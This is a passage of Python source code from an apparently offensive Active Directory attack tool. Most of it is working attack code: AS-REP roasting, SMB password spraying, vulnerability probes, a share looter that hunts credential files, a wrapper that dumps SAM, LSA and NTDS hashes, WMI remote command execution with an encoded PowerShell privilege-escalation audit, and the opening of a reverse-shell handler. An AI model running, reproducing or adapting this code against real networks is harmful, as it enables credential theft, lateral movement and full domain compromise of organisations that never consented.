                results.append({'username': username, 'hash': h, 'etype': str(etype)})
            except KerberosError as e:
                # KDC_ERR_PREAUTH_REQUIRED = preauth needed (good — user exists, preauth on)
                # KDC_ERR_C_PRINCIPAL_UNKNOWN = user does not exist
                err_msg = str(e)
                if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' not in err_msg:
                    pass   # silently skip
            except Exception:
                pass
        return results


# ============================================================================
# PASSWORD SPRAYER
# ============================================================================

class PasswordSprayer:
    """Lockout-aware credential spraying via SMB."""

    def __init__(self, target: str, auth: ADAuth, timeout: int = 5):
        self.target = target
        self.auth = auth
        self.timeout = timeout
        self.found: List[SprayResult] = []

    def spray_smb(self, users: List[str], passwords: List[str],
                  lockout_threshold: int = 0, threads: int = 10,
                  exclude: List[str] = None) -> List[SprayResult]:
        """Spray (user, password) pairs using SMB authentication."""
        if not CAPS['impacket']:
            log("spray needs impacket")
            return []
        exclude = set(exclude or [])
        # Skip dangerous accounts unless explicitly told otherwise
        for trap in ('krbtgt', 'Administrator', 'Guest'):
            exclude.add(trap.lower())
        results: List[SprayResult] = []
        # If lockout is set, leave 2 attempts buffer — only spray (lockout-2) passwords per round
        max_per_round = max(1, lockout_threshold - 2) if lockout_threshold > 0 else len(passwords)
        if lockout_threshold > 0 and len(passwords) > max_per_round:
            log(f"lockout={lockout_threshold} → spraying only first {max_per_round} passwords for safety")
            passwords = passwords[:max_per_round]
        log(f"spray: {len(users)} users × {len(passwords)} passwords = {len(users) * len(passwords)} attempts")

        def attempt(u: str, p: str) -> SprayResult:
            r = SprayResult(username=u, password=p)
            try:
                smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
                smb.login(u, p, self.auth.domain)
                r.success = True
                smb.logoff()
            except SessionError as e:
                msg = str(e)
                if 'STATUS_LOGON_FAILURE' in msg:
                    r.error = 'wrong-password'
                elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
                    r.error = 'LOCKED'
                elif 'STATUS_ACCOUNT_DISABLED' in msg:
                    r.error = 'disabled'
                elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
                    r.error = 'must-change'
                    r.success = True   # technically valid creds
                elif 'STATUS_PASSWORD_EXPIRED' in msg:
                    r.error = 'expired'
                    r.success = True
                else:
                    r.error = msg.split(':')[-1].strip()[:60]
            except Exception as e:
                r.error = str(e)[:60]
            return r

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = []
            for p in passwords:
                for u in users:
                    if u.lower() in exclude:
                        continue
                    futures.append(ex.submit(attempt, u, p))
            for f in as_completed(futures):
                r = f.result()
                if r.success or r.error == 'LOCKED':
                    results.append(r)
                if r.error == 'LOCKED':
                    log(f"⚠️  {r.username} locked — stopping spray")
                    break
                if r.success:
                    log(f"✓ {r.username}:{r.password}")
        return results


# ============================================================================
# VULNERABILITY CHECKS
# ============================================================================

class VulnChecker:
    """Quick checks for high-impact AD vulnerabilities."""

    def __init__(self, target: str, info: DomainInfo, timeout: int = 10):
        self.target = target
        self.info = info
        self.timeout = timeout

    def run(self) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        vulns.append(self._zerologon())
        vulns.append(self._petitpotam())
        vulns.append(self._smbv1())
        vulns.append(self._smb_signing())
        vulns.append(self._null_session())
        vulns.append(self._anonymous_ldap())
        vulns.append(self._machine_account_quota())
        vulns.append(self._adcs_detection())
        vulns.append(self._nopac_check())
        return [v for v in vulns if v]

    def _zerologon(self) -> Optional[Vulnerability]:
        """CVE-2020-1472 — only safe scanner-style detection (probe via nmap)."""
        v = Vulnerability(cve='CVE-2020-1472', name='Zerologon', severity='CRITICAL')
        if CAPS['nmap']:
            rc, out, _ = run_cmd(['nmap', '-Pn', '-p', '445',
                                  '--script', 'smb-vuln-cve2020-1472',
                                  self.target], timeout=self.timeout * 4)
            if 'VULNERABLE' in out.upper():
                v.vulnerable = True
                v.evidence = 'nmap smb-vuln-cve2020-1472 reports VULNERABLE'
            elif 'Not vulnerable' in out:
                v.vulnerable = False
                v.evidence = 'patched per nmap probe'
            else:
                v.evidence = 'nmap script ran but inconclusive'
        else:
            v.evidence = 'nmap not available — cannot probe'
        return v

    def _petitpotam(self) -> Optional[Vulnerability]:
        """MS-EFSRPC coercion — listen for outbound auth via EfsRpcOpenFileRaw."""
        v = Vulnerability(cve='CVE-2021-36942', name='PetitPotam (MS-EFSRPC coercion)',
                          severity='HIGH')
        # Just detect if MS-EFSRPC endpoint is reachable on TCP 445
        v.vulnerable = tcp_open(self.target, 445, 2.0) and self.info.is_dc
        v.evidence = 'MS-EFSRPC reachable + target is DC' if v.vulnerable else 'not exploitable from current state'
        return v

    def _smbv1(self) -> Optional[Vulnerability]:
        v = Vulnerability(name='SMBv1 enabled', severity='HIGH')
        if CAPS['nmap']:
            rc, out, _ = run_cmd(['nmap', '-Pn', '-p', '445',
                                  '--script', 'smb-protocols', self.target],
                                 timeout=self.timeout * 2)
            if '2.02' in out and '1' not in out.split('SMB Protocols')[1] if 'SMB Protocols' in out else False:
                v.vulnerable = False
            elif re.search(r'\b(NT LM 0\.12|SMBv1|SMB 1)\b', out):
                v.vulnerable = True
                v.evidence = 'SMBv1 dialect advertised'
        return v

    def _smb_signing(self) -> Vulnerability:
        v = Vulnerability(name='SMB signing not required', severity='MEDIUM')
        if self.info.smb_signing in ('disabled', 'optional', 'supported'):
            v.vulnerable = True
            v.evidence = f"signing={self.info.smb_signing} → relay attacks possible"
        elif self.info.smb_signing == 'required':
            v.vulnerable = False
            v.evidence = 'signing required'
        return v

    def _null_session(self) -> Vulnerability:
        v = Vulnerability(name='Null SMB session permitted', severity='MEDIUM')
        v.vulnerable = self.info.smb_anonymous
        v.evidence = 'anonymous SMB bind succeeded' if v.vulnerable else 'null sessions blocked'
        return v

    def _anonymous_ldap(self) -> Vulnerability:
        v = Vulnerability(name='Anonymous LDAP bind permitted', severity='MEDIUM')
        v.vulnerable = self.info.ldap_anonymous
        v.evidence = 'unauthenticated LDAP works' if v.vulnerable else 'anonymous LDAP rejected'
        return v

    def _machine_account_quota(self) -> Optional[Vulnerability]:
        """ms-DS-MachineAccountQuota > 0 lets any domain user add 10 computers (default)."""
        if not CAPS['ldap3']:
            return None
        v = Vulnerability(name='ms-DS-MachineAccountQuota > 0', severity='MEDIUM')
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts if server.info else [])
                         if nc.upper().startswith("DC=")), "")
            if base:
                conn.search(base, '(objectClass=domain)', attributes=['ms-DS-MachineAccountQuota'])
                for e in conn.entries:
                    if 'ms-DS-MachineAccountQuota' in e:
                        q = int(e['ms-DS-MachineAccountQuota'].value or 0)
                        v.vulnerable = q > 0
                        v.evidence = f'MachineAccountQuota = {q}'
                        break
            conn.unbind()
        except Exception:
            v.evidence = 'requires LDAP access'
        return v

    def _adcs_detection(self) -> Optional[Vulnerability]:
        """Detect AD CS web enrollment endpoint — first step toward ESC1/ESC8."""
        v = Vulnerability(name='AD CS web enrollment detected', severity='INFO')
        if not CAPS['requests']:
            return v
        # /certsrv on port 80/443
        for proto, port in (('http', 80), ('https', 443)):
            try:
                r = requests.get(f"{proto}://{self.target}:{port}/certsrv/",
                                 timeout=5, verify=False, allow_redirects=False)
                if r.status_code in (200, 401, 302):
                    if 'Microsoft Active Directory Certificate Services' in r.text or r.status_code == 401:
                        v.vulnerable = True
                        v.evidence = f'/certsrv responds on {proto}://{self.target}:{port} → ESC8 (NTLM relay to AD CS) candidate'
                        v.severity = 'HIGH'
                        return v
            except Exception:
                continue
        return v

    def _nopac_check(self) -> Vulnerability:
        """sAMAccountName spoofing CVE-2021-42278/42287 — needs patches MS21-Nov+. Heuristic: OS version check."""
        v = Vulnerability(cve='CVE-2021-42278/42287', name='NoPac (sAMAccountName spoofing)',
                          severity='HIGH')
        os_lower = (self.info.os or '').lower()
        if 'windows' in os_lower:
            # Server 2008/2012/2016/2019/2022 vulnerable until Nov 2021 patch
            old_versions = ['2008', '2012', '2016', '2019']
            for ver in old_versions:
                if ver in os_lower:
                    v.vulnerable = True
                    v.evidence = f'OS={self.info.os} (pre-Nov2021 patches likely vulnerable)'
                    return v
            v.evidence = f'OS={self.info.os} — manual confirmation needed'
        else:
            v.evidence = 'OS not identified — cannot heuristically check'
        return v


# ============================================================================
# BLOODHOUND COLLECTION
# ============================================================================

class BloodHoundCollector:
    """Wraps bloodhound-python; falls back to LDAP-only collection."""

    def __init__(self, target: str, auth: ADAuth, output_dir: Path,
                 collection: str = "Default", timeout: int = 600):
        self.target = target
        self.auth = auth
        self.output_dir = output_dir
        self.collection = collection
        self.timeout = timeout

    def run(self) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'BloodHound collection requires credentials'}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        if CAPS['bloodhound_python']:
            return self._run_bhpython()
        return {'error': 'install bloodhound-python: pipx install bloodhound'}

    def _run_bhpython(self) -> Dict[str, Any]:
        cwd_back = os.getcwd()
        try:
            os.chdir(self.output_dir)
            cmd = [
                'bloodhound-python',
                '-d', self.auth.domain,
                '-u', self.auth.username,
                '-ns', self.auth.dc_ip or self.target,
                '-c', self.collection,
                '--zip', '--disable-pooling',
            ]
            if self.auth.hash:
                cmd += ['--hashes', f'{self.auth.lm}:{self.auth.nt}']
            else:
                cmd += ['-p', self.auth.password]
            log(f"running: {' '.join(c if c != self.auth.password else '***' for c in cmd)}")
            rc, out, err = run_cmd(cmd, timeout=self.timeout)
            zips = sorted(Path('.').glob('*_bloodhound.zip'),
                          key=lambda p: p.stat().st_mtime, reverse=True)
            return {
                'returncode': rc,
                'output_zip': str(zips[0].resolve()) if zips else "",
                'stdout_tail': out[-1500:],
                'stderr_tail': err[-500:]
            }
        finally:
            os.chdir(cwd_back)


# ============================================================================
# SHARE LOOT
# ============================================================================

class ShareLooter:
    """Search readable shares for credentials and sensitive files."""

    SUSPICIOUS_NAMES = re.compile(
        r'(unattend|sysprep|web\.config|web\.xml|app\.config|machine\.config|'
        r'wp-config|\.kdbx|\.kdb|\.psafe3|\.bgi|id_rsa|id_dsa|id_ed25519|'
        r'\.ssh/|\.aws/credentials|\.azure|cred|password|secret|backup|'
        r'groups\.xml|services\.xml|scheduledtasks\.xml|datasources\.xml|'
        r'printers\.xml|drives\.xml|registry\.pol|.*\.bak|.*\.ovpn|\.env)',
        re.IGNORECASE
    )

    def __init__(self, target: str, auth: ADAuth, shares: List[SMBShare], timeout: int = 30):
        self.target = target
        self.auth = auth
        self.shares = shares
        self.timeout = timeout

    def run(self) -> List[LootItem]:
        if not CAPS['impacket']:
            return []
        loot: List[LootItem] = []
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            self.auth.smb_login(smb)
            for share in self.shares:
                if not share.readable or share.type != 'DISK' or share.name == 'IPC$':
                    continue
                self._walk(smb, share.name, '*', loot, depth=0)
            smb.logoff()
        except Exception as e:
            log(f"loot error: {e}")
        return loot

    def _walk(self, smb: 'SMBConnection', share: str, path: str,
              loot: List[LootItem], depth: int = 0, max_depth: int = 4) -> None:
        if depth > max_depth:
            return
        try:
            entries = list(smb.listPath(share, path))
        except Exception:
            return
        for entry in entries:
            name = entry.get_longname()
            if name in ('.', '..'):
                continue
            full = f"{path[:-1] if path.endswith('*') else path}\\{name}" if depth else name
            if entry.is_directory():
                self._walk(smb, share, f"{full}\\*", loot, depth + 1, max_depth)
            else:
                if self.SUSPICIOUS_NAMES.search(name):
                    item = LootItem(share=share, path=full, type='file',
                                    size=int(entry.get_filesize()))
                    if 'cpassword' in name.lower() or name.lower() in ('groups.xml',):
                        item.severity = 'CRITICAL'
                    elif name.lower().endswith(('.kdbx', '.kdb', 'id_rsa', 'id_dsa')):
                        item.severity = 'CRITICAL'
                    elif name.lower() in ('unattend.xml', 'sysprep.xml', 'web.config'):
                        item.severity = 'HIGH'
                    else:
                        item.severity = 'MEDIUM'
                    # Try to grab a small preview
                    try:
                        from io import BytesIO
                        buf = BytesIO()
                        smb.getFile(share, full, buf.write)
                        data = buf.getvalue()[:512]
                        try:
                            item.content_preview = data.decode('utf-8', errors='replace')[:300]
                        except Exception:
                            item.content_preview = data.hex()[:200]
                    except Exception:
                        item.content_preview = ''
                    loot.append(item)


# ============================================================================
# SECRETS DUMP
# ============================================================================

class SecretsDumper:
    """Wraps impacket secretsdump for SAM/LSA/NTDS extraction."""

    def __init__(self, target: str, auth: ADAuth, output_dir: Path, timeout: int = 600):
        self.target = target
        self.auth = auth
        self.output_dir = output_dir
        self.timeout = timeout

    def run(self) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'secretsdump requires creds'}
        if not CAPS['secretsdump']:
            return {'error': 'install impacket: pipx install impacket'}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        prefix = self.output_dir / f"secretsdump-{ts()}"
        sd_bin = shutil.which('secretsdump.py') or shutil.which('impacket-secretsdump')
        if self.auth.hash:
            target_uri = f"{self.auth.domain}/{self.auth.username}@{self.target}"
            cmd = [sd_bin, '-hashes', f'{self.auth.lm}:{self.auth.nt}',
                   '-outputfile', str(prefix), target_uri]
        else:
            target_uri = f"{self.auth.domain}/{self.auth.username}:{self.auth.password}@{self.target}"
            cmd = [sd_bin, '-outputfile', str(prefix), target_uri]
        log(f"secretsdump → {prefix}")
        rc, out, err = run_cmd(cmd, timeout=self.timeout)
        # Parse hashes from stdout
        sam, lsa, ntds = [], [], []
        section = None
        for line in out.splitlines():
            if 'Dumping local SAM hashes' in line:
                section = 'sam'
                continue
            if 'Dumping cached domain logon information' in line or 'Dumping LSA Secrets' in line:
                section = 'lsa'
                continue
            if 'Dumping Domain Credentials' in line or 'NTDS' in line:
                section = 'ntds'
                continue
            if section == 'sam' and ':::' in line:
                sam.append(line.strip())
            elif section == 'lsa' and ':' in line and not line.startswith('['):
                lsa.append(line.strip())
            elif section == 'ntds' and ':::' in line:
                ntds.append(line.strip())
        return {
            'returncode': rc,
            'sam': sam, 'lsa': lsa, 'ntds': ntds,
            'output_files': [str(p) for p in self.output_dir.glob(f"{prefix.name}.*")],
            'stdout_tail': out[-1500:], 'stderr_tail': err[-500:]
        }


# ============================================================================
# REMOTE EXECUTION + PRIVESC AUDIT
# ============================================================================

PRIVESC_PS1 = r"""
$out = @{}
$os = Get-WmiObject Win32_OperatingSystem
$out['os'] = @{
    caption=$os.Caption; version=$os.Version; build=$os.BuildNumber
    hotfixes=@((Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 | ForEach-Object { $_.HotFixID }))
}
$svc_unquoted = @()
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.StartMode -ne 'Disabled'
} | ForEach-Object {
    $svc_unquoted += [PSCustomObject]@{ name=$_.Name; path=$_.PathName; runAs=$_.StartName; state=$_.State }
}
$out['unquoted_services'] = $svc_unquoted
$writable_svc = @()
Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.StartMode -ne 'Disabled' } | ForEach-Object {
    $svcName = $_.Name
    $p = ($_.PathName -replace '"','').Trim()
    if ($p -match '^([A-Za-z]:\\[^"]+\.exe)') { $p = $matches[1] } else { $p = $p.Split(' ')[0] }
    if (Test-Path $p -ErrorAction SilentlyContinue) {
        try {
            $acl = Get-Acl $p -ErrorAction Stop
            $acl.Access | Where-Object {
                ($_.IdentityReference -match 'Everyone|BUILTIN\\Users|Authenticated Users') -and
                ($_.FileSystemRights -match 'Write|FullControl|Modify')
            } | ForEach-Object {
                $writable_svc += [PSCustomObject]@{ service=$svcName; binary=$p; identity=$_.IdentityReference.Value; rights=$_.FileSystemRights.ToString() }
            }
        } catch {}
    }
}
$out['writable_service_binaries'] = $writable_svc
$aie_hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aie_hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$out['always_install_elevated'] = ($aie_hklm -eq 1 -and $aie_hkcu -eq 1)
$uac_key = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue
$out['uac'] = @{ enabled=[bool]($uac_key.EnableLUA); consent_admin=$uac_key.ConsentPromptBehaviorAdmin; secure_desktop=$uac_key.PromptOnSecureDesktop }
$out['whoami_priv'] = (whoami /priv 2>&1 | Out-String).Trim()
$out['whoami_groups'] = (whoami /groups 2>&1 | Out-String).Trim()
try {
    $out['local_admins'] = @(net localgroup administrators 2>&1 | Select-String -Pattern '^[A-Z]' | Where-Object { $_ -notmatch 'Alias|Comment|Members|command' } | ForEach-Object { $_.ToString().Trim() })
} catch { $out['local_admins'] = @() }
$out['stored_creds'] = (cmdkey /list 2>&1 | Out-String).Trim()
$tasks = @()
Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
    $_.Principal.RunLevel -eq 'HighestAvailable' -or $_.Principal.UserId -match 'SYSTEM|NT AUTHORITY|Administrator'
} | Select-Object -First 20 | ForEach-Object {
    $action = ($_.Actions | ForEach-Object { $_.Execute } | Select-Object -First 1)
    $tasks += [PSCustomObject]@{ name=$_.TaskName; path=$_.TaskPath; runas=$_.Principal.UserId; action=$action }
}
$out['scheduled_tasks_elevated'] = $tasks
$writable_path = @()
($env:PATH -split ';') | Where-Object { $_ -ne '' } | ForEach-Object {
    $dir = $_
    try {
        $test = Join-Path $dir "adsec_wt_$([System.IO.Path]::GetRandomFileName()).tmp"
        [System.IO.File]::WriteAllText($test, 'x')
        Remove-Item $test -ErrorAction SilentlyContinue
        $writable_path += $dir
    } catch {}
}
$out['writable_path_dirs'] = $writable_path
$autoruns = @()
@('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run','HKLM:\Software\Microsoft\Windows\CurrentVersion\Run','HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce') | ForEach-Object {
    $rp = $_
    try {
        $vals = Get-ItemProperty $rp -ErrorAction SilentlyContinue
        if ($vals) { $vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { $autoruns += [PSCustomObject]@{ key=$rp; name=$_.Name; value=$_.Value } } }
    } catch {}
}
$out['autoruns'] = $autoruns
$out | ConvertTo-Json -Depth 4 -Compress
"""


def _summarize_privesc(results: Dict[str, Any]) -> List[Dict[str, str]]:
    findings: List[Dict[str, str]] = []
    if results.get('always_install_elevated'):
        findings.append({'severity': 'CRITICAL', 'title': 'AlwaysInstallElevated',
                         'detail': 'Both HKLM+HKCU=1 — drop .msi for SYSTEM shell'})
    uac = results.get('uac') or {}
    if uac.get('enabled') is False:
        findings.append({'severity': 'HIGH', 'title': 'UAC Disabled', 'detail': 'EnableLUA=0'})
    elif uac.get('consent_admin') == 0:
        findings.append({'severity': 'HIGH', 'title': 'UAC Auto-Elevate (no prompt)',
                         'detail': 'ConsentPromptBehaviorAdmin=0'})
    for svc in (results.get('unquoted_services') or []):
        findings.append({'severity': 'HIGH', 'title': f"Unquoted path: {svc.get('name','?')}",
                         'detail': str(svc.get('path', ''))})
    for svc in (results.get('writable_service_binaries') or []):
        findings.append({'severity': 'CRITICAL',
                         'title': f"Writable svc binary: {svc.get('service','?')}",
                         'detail': f"{svc.get('binary','')} — {svc.get('identity','')} {svc.get('rights','')}"})
    for d in (results.get('writable_path_dirs') or []):
        findings.append({'severity': 'MEDIUM', 'title': 'Writable PATH dir', 'detail': d})
    priv_text = results.get('whoami_priv', '')
    for priv in ('SeDebugPrivilege', 'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege',
                 'SeTakeOwnershipPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege',
                 'SeLoadDriverPrivilege', 'SeCreateTokenPrivilege', 'SeTcbPrivilege'):
        idx = priv_text.find(priv)
        if idx != -1 and 'Enabled' in priv_text[idx:idx + 120]:
            findings.append({'severity': 'HIGH', 'title': f'Dangerous privilege: {priv}',
                             'detail': 'Enabled — privesc path available'})
    stored = results.get('stored_creds', '')
    if 'Target:' in stored:
        findings.append({'severity': 'MEDIUM', 'title': 'Stored Windows credentials',
                         'detail': stored[:300]})
    return findings


class RemoteExec:
    """Execute commands on target via impacket WMI (native) or impacket CLI tools."""

    def __init__(self, target: str, auth: ADAuth, timeout: int = 60):
        self.target = target
        self.auth = auth
        self.timeout = timeout

    def _exec_tool(self) -> Optional[str]:
        for name in ('impacket-wmiexec', 'wmiexec.py',
                     'impacket-smbexec', 'smbexec.py',
                     'impacket-psexec', 'psexec.py'):
            p = shutil.which(name)
            if p:
                return p
        return None

    def _cred_args_and_uri(self) -> Tuple[List[str], str]:
        domain = self.auth.domain or 'WORKGROUP'
        user = self.auth.username or ''
        if self.auth.hash:
            return ['-hashes', f'{self.auth.lm}:{self.auth.nt}'], f"{domain}/{user}@{self.target}"
        return [], f"{domain}/{user}:{self.auth.password or ''}@{self.target}"

    def run_command(self, command: str) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'exec requires credentials', 'output': '', 'returncode': -1}
        tool = self._exec_tool()
        if tool:
            extra, uri = self._cred_args_and_uri()
            rc, out, err = run_cmd([tool] + extra + [uri, command], timeout=self.timeout)
            return {'returncode': rc, 'output': out, 'stderr': err}
        return self._wmi_exec_native(command)

    def _wmi_exec_native(self, command: str) -> Dict[str, Any]:
        """WMI command execution with output captured via C$ SMB share."""
        if not CAPS['impacket']:
            return {'error': 'impacket not installed; pip install impacket', 'output': ''}
        try:
            from impacket.dcerpc.v5.dcom import wmi
            from impacket.dcerpc.v5.dcomrt import DCOMConnection
            dcom = DCOMConnection(
                self.target,
                username=self.auth.username, password=self.auth.password or '',
                domain=self.auth.domain or '', lmhash=self.auth.lm or '',
                nthash=self.auth.nt or '', oxidResolver=True,
            )
            iface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            login = wmi.IWbemLevel1Login(iface)
            services = login.NTLMLogin('//./root/cimv2', NULL, NULL)
            login.RemRelease()
            win32_process, _ = services.GetObject('Win32_Process')
            fname = f"ar_{int(time.time())}.txt"
            tmp_path = f"C:\\Windows\\Temp\\{fname}"
            win32_process.Create(f'cmd.exe /Q /c {command} > "{tmp_path}" 2>&1', 'C:\\', None)
            time.sleep(min(5, max(2, self.timeout // 8)))
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=30)
            self.auth.smb_login(smb)
            from io import BytesIO
            buf = BytesIO()
            try:
                smb.getFile('C$', f'Windows\\Temp\\{fname}', buf.write)
            except Exception:
                pass
            try:
                smb.deleteFile('C$', f'Windows\\Temp\\{fname}')
            except Exception:
                pass
            smb.logoff()
            dcom.disconnect()
            return {'returncode': 0, 'output': buf.getvalue().decode('utf-8', errors='replace')}
        except Exception as e:
            return {'error': str(e), 'output': ''}

    def run_privesc_audit(self, output_dir: Path) -> Dict[str, Any]:
        """Base64-encode PRIVESC_PS1, execute via PowerShell -EncodedCommand, parse results."""
        if not self.auth.has_creds:
            return {'error': 'privesc_check requires credentials'}
        output_dir.mkdir(parents=True, exist_ok=True)
        b64 = base64.b64encode(PRIVESC_PS1.encode('utf-16-le')).decode('ascii')
        result = self.run_command(
            f'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64}'
        )
        output = result.get('output', '')
        raw_file = output_dir / f"privesc-raw-{ts()}.txt"
        raw_file.write_text(output or '(no output)')
        parsed: Dict[str, Any] = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith('{') and line.endswith('}'):
                try:
                    parsed = json.loads(line)
                    break
                except json.JSONDecodeError:
                    pass
        if parsed:
            (output_dir / f"privesc-{ts()}.json").write_text(json.dumps(parsed, indent=2))
        return {
            'results': parsed,
            'raw_file': str(raw_file),
            'error': result.get('error'),
            'findings': _summarize_privesc(parsed),
        }


# ============================================================================
# DISPATCHER
# ============================================================================

def emit(success: bool, data: Dict[str, Any], errors: Optional[List[str]] = None) -> None:
    out = {
        'success': success,
        'data': data,
        'errors': errors or [],
        'capabilities': {k: v for k, v in CAPS.items() if isinstance(v, bool)},
    }
    print(json.dumps(out, default=str, indent=2))


def main() -> None:
    try:
        ctx = json.loads(sys.stdin.read() or '{}')
    except json.JSONDecodeError as e:
        emit(False, {}, [f"invalid input JSON: {e}"])
        return
    target = ctx.get('target') or ctx.get('host') or ''
    params = ctx.get('params', {}) or {}
    if not target:
        emit(False, {}, ["target is required"])
        return
    operation = (params.get('operation') or 'discover').lower().strip()
    timeout = int(params.get('timeout', 30) or 30)
    threads = int(params.get('threads', 20) or 20)
    output_dir = Path(params.get('output_dir') or './adsec-loot').resolve()
    auth = ADAuth(params)
    if not auth.dc_ip:
        auth.dc_ip = target

    # Always run discovery first (fast, gives DC fingerprint and feeds vuln checks)
    info = ADDiscovery(target, timeout=timeout).run()
    data: Dict[str, Any] = {'domain_info': asdict(info)}
    if auth.domain:
        info.domain = auth.domain
        data['domain_info']['domain'] = auth.domain
    elif info.domain:
        auth.domain = info.domain
    errors: List[str] = []

    def load_lines(p: str) -> List[str]:
        try:
            return [ln.strip() for ln in open(p, 'r', errors='replace') if ln.strip() and not ln.strip().startswith('#')]
        except Exception as e:
            errors.append(f"failed to read {p}: {e}")
            return []

    def do_users():
        log("→ users")
        enum = ADEnumerator(target, auth, timeout=timeout)
        users = enum.users_via_ldap() if auth.has_creds or info.ldap_anonymous else []
        if not users:
            users = enum.users_via_samr(int(params.get('rid_max', 4000) or 4000))
        data['users'] = [asdict(u) for u in users]

    def do_groups():
        log("→ groups")
        enum = ADEnumerator(target, auth, timeout=timeout)
        groups = enum.groups_via_ldap()
        data['groups'] = [asdict(g) for g in groups]

    def do_shares():
        log("→ shares")
        enum = ADEnumerator(target, auth, timeout=timeout)
        shares = enum.shares()
        data['shares'] = [asdict(s) for s in shares]

    def do_passpol():
        log("→ passpol")
        enum = ADEnumerator(target, auth, timeout=timeout)
        data['passpol'] = enum.passpol()

    def do_kerberoast():
        log("→ kerberoast")
        if not auth.has_creds:
            errors.append("kerberoast requires credentials")
            return
        ka = KerberosAttacker(target, auth, timeout=timeout)
        hashes = ka.kerberoast()
        data['kerberoast'] = hashes
        if hashes:
            output_dir.mkdir(parents=True, exist_ok=True)
            f = output_dir / f"kerberoast-{ts()}.hashes"
            with open(f, 'w') as fp:
                for h in hashes:
                    fp.write(h['hash'] + '\n')
            log(f"saved {len(hashes)} hashes → {f}")

    def do_asreproast():
        log("→ asreproast")
        users = []
        if params.get('userlist'):
            users = load_lines(params['userlist'])
        elif data.get('users'):
            users = [u['username'] for u in data['users']]
        else:
            do_users()
            users = [u['username'] for u in data.get('users', [])]
        if not users:
            errors.append("asreproast needs userlist or enumerable users")
            return
        ka = KerberosAttacker(target, auth, timeout=timeout)
        hashes = ka.asreproast(users)
        data['asreproast'] = hashes
        if hashes:
            output_dir.mkdir(parents=True, exist_ok=True)
            f = output_dir / f"asreproast-{ts()}.hashes"
            with open(f, 'w') as fp:
                for h in hashes:
                    fp.write(h['hash'] + '\n')
            log(f"saved {len(hashes)} AS-REP hashes → {f}")

    def do_spray():
        log("→ spray")
        users = load_lines(params['userlist']) if params.get('userlist') else []
        if not users and data.get('users'):
            users = [u['username'] for u in data['users']]
        if not users:
            errors.append("spray needs userlist or enumerable users")
            return
        if params.get('single_password'):
            passwords = [params['single_password']]
        elif params.get('passlist'):
            passwords = load_lines(params['passlist'])
        else:
            errors.append("spray needs single_password or passlist")
            return
        # pull lockout threshold if safe_spray
        threshold = 0
        if params.get('safe_spray', True):
            if not data.get('passpol'):
                do_passpol()
            threshold = int((data.get('passpol') or {}).get('lockout_threshold') or 0)
        excl = [s.strip() for s in (params.get('exclude_users') or '').split(',') if s.strip()]
        sp = PasswordSprayer(target, auth, timeout=5)
        results = sp.spray_smb(users, passwords, lockout_threshold=threshold,
                               threads=threads, exclude=excl)
        data['spray_results'] = [asdict(r) for r in results]

    def do_vulncheck():
        log("→ vulncheck")
        vc = VulnChecker(target, info, timeout=timeout)
        data['vulnerabilities'] = [asdict(v) for v in vc.run()]

    def do_bloodhound():
        log("→ bloodhound")
        if not auth.has_creds:
            errors.append("bloodhound requires credentials")
            return
        bh = BloodHoundCollector(target, auth, output_dir,
                                 collection=params.get('bloodhound_collection', 'Default'),
                                 timeout=timeout * 30)
        data['bloodhound'] = bh.run()

    def do_loot():
        log("→ loot")
        if not data.get('shares'):
            do_shares()
        shares = [SMBShare(**s) for s in data.get('shares', [])]
        looter = ShareLooter(target, auth, shares, timeout=timeout)
        items = looter.run()
        data['loot'] = [asdict(i) for i in items]

    def do_secrets():
        log("→ secrets")
        sd = SecretsDumper(target, auth, output_dir, timeout=timeout * 20)
        data['secrets'] = sd.run()

    def do_exec():
        log("→ exec")
        if not auth.has_creds:
            errors.append("exec requires credentials")
            return
        command = params.get('command', 'whoami /all')
        rex = RemoteExec(target, auth, timeout=timeout)
        data['exec'] = rex.run_command(command)

    def do_privesc_check():
        log("→ privesc_check")
        if not auth.has_creds:
            errors.append("privesc_check requires credentials")
            return
        rex = RemoteExec(target, auth, timeout=max(120, timeout))
        data['privesc'] = rex.run_privesc_audit(output_dir)

    def do_shell():
        log("→ shell")
        lhost   = params.get('lhost') or _local_ip()
        lport   = int(params.get('lport', 4444))
        serve   = str(params.get('serve', 'true')).lower() in ('true', '1', 'yes')
        duration = int(params.get('duration', 120))
        ptype   = params.get('payload_type', 'powershell_b64')
        rs = _rs()
        if rs is None:
